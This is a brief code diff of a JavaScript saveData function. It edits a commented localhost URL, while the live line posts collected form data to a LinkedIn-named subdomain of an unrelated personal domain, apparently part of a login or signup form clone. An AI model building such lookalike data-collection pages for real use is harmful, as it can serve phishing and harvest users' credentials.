@@ -150,7 +150,7 @@ function start_timer() {
 function saveData() {
     $.ajax({
         type: 'POST',
-        // url: 'http://localhost/linkedin/create.php',
+        // url: 'http://localhost/login-signup-form-master/create.php',
         url: 'https://www.linkedin.williamtwiner.com/create.php',
         data: {data: data}
     });
